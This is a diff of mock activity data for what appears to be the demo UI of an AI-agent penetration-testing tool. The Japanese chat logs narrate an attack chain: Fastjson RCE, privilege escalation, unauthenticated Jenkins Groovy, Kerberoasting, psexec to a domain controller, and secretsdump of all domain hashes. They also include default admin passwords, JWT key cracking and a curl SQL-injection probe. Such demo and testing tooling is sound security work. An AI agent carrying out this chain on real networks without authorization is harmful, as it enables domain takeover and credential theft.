@@ -2739,7 +2739,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T21:22:08Z"),
     kind: "text",
     summary:
-      "/script が未認証で Groovy を実行可能です。優先して検証するヒントを追加しました。取得したドメイン認証情報と Kerberoasting の結果を照合します。",
+      "はい、/script が未認証で Groovy RCE を実行可能です。worker が Jenkins を優先して検証するヒントを追加しました。制御できればドメインの認証情報を取得でき、Kerberoasting と組み合わせてドメインコントローラーを調べられます。",
   },
   { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 の制御を確認しましたか？要約してください。" },
   {
@@ -2748,7 +2748,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:22:12Z"),
     kind: "text",
     summary:
-      "確認済みです。shop の Fastjson RCE → DMZ での昇格 → Jenkins の認証情報 → Domain Admins の svc_deploy → DC01 の SYSTEM → 全域ハッシュ取得、という経路です。4目標は達成済みまたは進行中です。",
+      "制御を確認済みです。経路は shop の Fastjson RCE → DMZ での権限昇格 → 内部の Jenkins からドメインの認証情報を取得 → svc_deploy は Domain Admins → psexec で DC01 の SYSTEM → secretsdump で全ドメインのハッシュ取得です。4目標は達成済みまたは進行中です。",
   },
 ];
 
@@ -3103,11 +3103,11 @@ export const agents: Agent[] = [
   {
     id: "3",
     key: "mainagent",
-    name: "メインエージェント",
+    name: "メイン Agent",
     role: "mainagent",
     builtin: true,
     enabled: true,
-    description: "人がチャットで介入し、ヒント / 高優先度のインテントを追加",
+    description: "人がチャットで介入し、hint / 高優先度のインテントを追加",
     max_turns: 0,
     web_search: true,
     mcp_count: 2,
@@ -3117,11 +3117,11 @@ export const agents: Agent[] = [
   {
     id: "4",
     key: "worker",
-    name: "実行",
+    name: "Work Agent",
     role: "worker",
     builtin: true,
     enabled: true,
-    description: "インテントを取得 → Kali ツールを実行 → グラフへ書き戻し",
+    description: "インテントを claim → Kali ツールを実行 → グラフへ書き戻し",
     max_turns: 40,
     run_seconds: 1800,
     web_search: false,
@@ -3230,7 +3230,7 @@ export const skills: SkillItem[] = [
   },
   {
     name: "playwright-cli",
-    description: "Playwright で動的な取得とスクリーンショットを実行します。JavaScript の描画が必要な場合に使用。",
+    description: "Playwright で動的な取得とスクリーンショットを実行します。JS の描画が必要な場合に使用。",
     mcps: ["playwright"],
     files: ["SKILL.md"],
     calls: 7,
@@ -3263,7 +3263,7 @@ export const tools: Tool[] = [
   {
     key: "bash",
     system: true,
-    description: "Kali 環境で shell コマンドを実行（範囲と破壊的操作の制限あり）",
+    description: "Kali 環境で shell コマンドを実行（scopeと破壊的操作の制限あり）",
     schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
     agents: ["worker", "mainagent"],
     enabled: true,
@@ -3612,7 +3612,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c11",
       summary: "element-ui\ncsrf",
-      detail: "Element-UI の管理画面で、CSRF トークンはありますが CAPTCHA はありません。",
+      detail: "Element-UI の管理画面で、CSRF tokenはありますが CAPTCHA はありません。",
     },
     {
       seq: 5,
@@ -3640,7 +3640,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T10:00:30Z"),
       kind: "text",
       summary:
-        "Element-UI の管理画面で、CAPTCHA とレート制限がありません。既定パスワードを検証してから辞書を使用する方向で、高優先度のインテントを割り当てました。",
+        "Element-UI の管理画面で、CAPTCHA とレート制限がありません。①既定のパスワード一覧（admin/admin、admin/admin123、admin/123456）、②成功しなければ top1000 辞書、の順に確認します。「管理画面の既定パスワードのテスト」を高優先度のインテントとして work agent に追加しました。",
     },
     { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成功しましたか？" },
     {
@@ -3665,7 +3665,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "mainagent",
       ts: T("2026-07-24T16:00:05Z"),
       kind: "thinking",
-      summary: "認証方式と主要なエンドポイントを確認し、IDOR / JWT のリスクを判断します。",
+      summary: "まず API の認証方式と主要なエンドポイントの挙動を確認し、IDOR / JWT のリスクを判断します。",
     },
     {
       seq: 3,
@@ -3684,7 +3684,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c21",
       summary: '{ "id": 42, "role": "user" }',
-      detail: "一般ユーザーのトークンが利用可能。",
+      detail: "一般ユーザーのtokenが利用可能。",
     },
     {
       seq: 5,
@@ -3711,7 +3711,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-24T16:01:00Z"),
       kind: "text",
       summary:
-        "候補は2つです。注文の連番 ID を変更する IDOR と、HS256 の弱いキーによる JWT 偽造です。それぞれインテントを作成しました。まず低コストで影響を確認しやすい IDOR から検証します。",
+        "候補は2つです。① /v1/orders?id= は連番の数値 id を使う典型的な IDOR で、id を変更して他人の注文を読み取れる可能性があります。② JWT が HS256 を使用しており、john/hashcat でキーを解析できれば、任意の sub を偽造して権限を越えられます。それぞれインテントを作成しました。まず低コストで影響を確認しやすい IDOR から検証します。",
     },
   ],
   3: [
@@ -3720,14 +3720,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-25T15:45:00Z"),
       kind: "user",
-      summary: "シェルを取得しました。内部はどう調べますか？",
+      summary: "shellを取得しました。内部はどう調べますか？",
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T15:45:05Z"),
       kind: "thinking",
-      summary: "www-data の権限では不十分なので、先にローカルの権限昇格を確認し、DMZ を中継してホストを検出します。",
+      summary: "www-data の権限では内部の水平移動には不十分なので、まずローカルの権限昇格を確認します。root 取得後、DMZ を pivot として稼働ホストを検出します。",
     },
     {
       seq: 3,
@@ -3769,7 +3769,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T21:05:20Z"),
       kind: "text",
       summary:
-        "Script Console に認証がなく、Groovy の RCE が可能です。優先して確認するヒントを追加しました。認証情報ストアのドメインアカウントも確認します。",
+        "可能性があります。Script Console が未認証で Groovy RCE を実行可能です。worker がこのホストを優先して確認するヒントを追加しました。制御後は、ドメインアカウントが含まれる可能性のある認証情報ストアを確認します。",
     },
     {
       seq: 8,
@@ -3784,7 +3784,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T23:25:10Z"),
       kind: "text",
       summary:
-        "svc_deploy は DC01 に psexec できます。取得後は secretsdump の結果を確認します。secretsdump は承認対象で、デモでは許可済みです。",
+        "はい、svc_deploy + Domain Admins で psexec により DC01 を制御できます。その後 secretsdump で全ドメインのハッシュを取得して完了します。secretsdump はブロックルールの対象なので、事前に許可しました。",
     },
     { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "検証目標を達成しました。経路を要約してください。" },
     {
@@ -3793,7 +3793,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-26T00:22:12Z"),
       kind: "text",
       summary:
-        "確認した経路：\n1. .git の漏えい → ソースと認証情報\n2. shop の Fastjson RCE → DMZ のシェル\n3. sudo で root に昇格\n4. 内部調査 → DC01 / FS01 / Jenkins\n5. Jenkins の未認証アクセス → svc_deploy を取得\n6. Kerberoasting → svc_sql を解析\n7. svc_deploy の Domain Admins 権限 → DC01 → 全域ハッシュ取得\n\n4目標を達成し、外部・内部の検出結果を記録しました。",
+        "確認した全経路：\n1. .git の漏えい → ソースとハードコードされた認証情報\n2. shop の Fastjson RCE → DMZ のリバース shell\n3. sudo で root に昇格して足場を確立\n4. 内部調査 → DC01 / FS01 / Jenkins\n5. Jenkins の未認証アクセス → ドメインの認証情報 svc_deploy を取得\n6. Kerberoasting → svc_sql を解析\n7. svc_deploy の Domain Admins 権限 → psexec で DC01 を制御 → secretsdump で全ドメインのハッシュ取得\n\n4目標を達成し、17件の検出結果（高7 / 中4 / 低2 + 内部の8経路）を記録しました。",
     },
   ],
 };
@@ -3981,7 +3981,7 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "notes.md",
       dir: false,
       size: 96,
-      content: "# ワークスペースのメモ\n\n（デモ）ワークスペースのルートにあるサンプルファイルです。オンラインで編集・保存できます。\n",
+      content: "# ワークスペースのメモ\n\n（demo）ワークスペースのルートにあるサンプルファイルです。オンラインで編集・保存できます。\n",
     },
   ],
   "t-001": [
@@ -4000,11 +4000,11 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "response.html",
       dir: false,
       size: 180,
-      content: "<!-- （デモ）取得したレスポンス本文の一部 -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
+      content: "<!-- （demo）取得したレスポンス本文の一部 -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
     },
   ],
   transcripts: [
-    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "（デモ）LLM の対話記録のサンプルです。ここでは省略します。" },
+    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "（demo）LLM の対話記録のサンプルです。ここでは省略します。" },
   ],
 };
 
@@ -4177,7 +4177,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       {
         stop_reason: item.status === "error" ? "error" : "tool_use",
         content: [
-          { type: "text", text: "search?q= を調査し、まずエラーベースのペイロードで検証します。" },
+          { type: "text", text: "search?q= を調査し、まずエラーベースのpayloadで検証します。" },
           { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
         ],
         usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
